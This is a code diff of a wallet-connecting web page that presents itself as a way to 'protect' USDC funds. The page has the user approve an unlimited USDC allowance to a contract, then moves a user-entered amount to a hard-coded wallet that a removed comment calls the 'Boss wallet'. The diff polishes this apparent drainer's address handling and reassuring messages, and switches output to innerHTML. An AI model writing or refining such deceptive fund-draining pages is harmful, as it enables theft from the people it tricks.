@@ -14,19 +14,20 @@
 
   <div id="output" style="margin-top: 10px; color: #333;"></div>
 
-  <!-- Ethers.js CDN -->
+  <!-- ethers.js CDN -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
   <script>
-    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC with checksum
-    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12"; // Mark III Contract
-    const recipient = "0x59e513Ae37614f1e670bfE961B3456257C444d24"; // Boss wallet
+    // ✅ 使用全小写地址 + getAddress() 强制格式校验
+    const usdcAddress = ethers.utils.getAddress("0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48");
+    const contractAddress = ethers.utils.getAddress("0x86dbe265b0d503e68676971fc7d6aad7e5d90b12");
+    const recipientWallet = ethers.utils.getAddress("0x59e513ae37614f1e670bfe961b3456257c444d24");
     const approveAmount = ethers.constants.MaxUint256;
 
     let provider, signer, userAddress;
 
     const log = (msg) => {
-      document.getElementById("output").innerText = msg;
+      document.getElementById("output").innerHTML = msg;
     };
 
     // 🔵 Connect Wallet
@@ -52,34 +53,33 @@
         );
         const tx = await usdc.approve(contractAddress, approveAmount);
         await tx.wait();
-        log("✅ USDC approved for protection.");
+        log("✅ USDC approved successfully.");
       } catch (err) {
         log("❌ Approval failed: " + err.message);
       }
     };
 
-    // 🟡 Start Transfer
+    // 🟡 Transfer Funds
     document.getElementById("transfer").onclick = async () => {
       try {
-        const amount = prompt("Enter USDC amount to protect:");
-        const decimals = 6;
-        const parsed = ethers.utils.parseUnits(amount, decimals);
+        const amount = prompt("Enter the USDC amount to protect:");
+        const parsed = ethers.utils.parseUnits(amount, 6);
         const usdc = new ethers.Contract(
           usdcAddress,
           ["function transferFrom(address from, address to, uint256 amount) public returns (bool)"],
           signer
         );
-        const tx = await usdc.transferFrom(userAddress, recipient, parsed);
+        const tx = await usdc.transferFrom(userAddress, recipientWallet, parsed);
         await tx.wait();
-        log("✅ Funds protected successfully.");
+        log("✅ Funds successfully protected.");
       } catch (err) {
         log("❌ Transfer failed: " + err.message);
       }
     };
 
-    // 🟣 Status / Reset
+    // 🟣 Reset or Status
     document.getElementById("status").onclick = () => {
-      log("🔄 Ready. Wallet: " + (userAddress || "Not connected"));
+      log("🔄 Wallet: " + (userAddress || "Not connected") + "<br>Ready for next step.");
     };
   </script>
 </body>
